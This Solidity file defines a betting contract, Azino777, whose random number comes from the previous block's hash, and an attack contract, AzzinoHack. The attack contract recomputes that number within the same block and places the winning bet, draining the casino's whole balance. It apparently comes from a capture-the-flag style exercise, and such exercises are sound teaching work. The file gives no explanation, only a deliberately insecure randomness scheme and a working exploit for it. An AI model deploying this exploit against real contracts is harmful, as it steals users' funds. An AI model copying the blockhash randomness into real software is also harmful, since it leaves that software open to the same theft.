pragma solidity ^0.8.20;

contract Azino777 {
    function spin(uint256 bet) public payable {
        require(msg.value >= 0.01 ether);
        uint256 num = rand(100);
        if (num == bet) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    //Generate random number between 0 & max
    uint256 private constant FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;

    function rand(uint256 max) private view returns (uint256 result) {
        uint256 factor = FACTOR * 100 / max;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));

        return uint256((uint256(hashVal) / factor)) % max;
    }

    receive() external payable {}
}

contract AzzinoHack {
    Azino777 public target;

    constructor(address payable _target) {
        target = Azino777(_target);
    }

    uint256 private constant FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;

    function attack() external payable {
        // max is always passed as 100
        uint256 factor = FACTOR * 100 / 100;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));

        uint256 bet = uint256((uint256(hashVal) / factor)) % 100;
        target.spin{value: address(this).balance}(bet);
    }

    receive() external payable {}
}
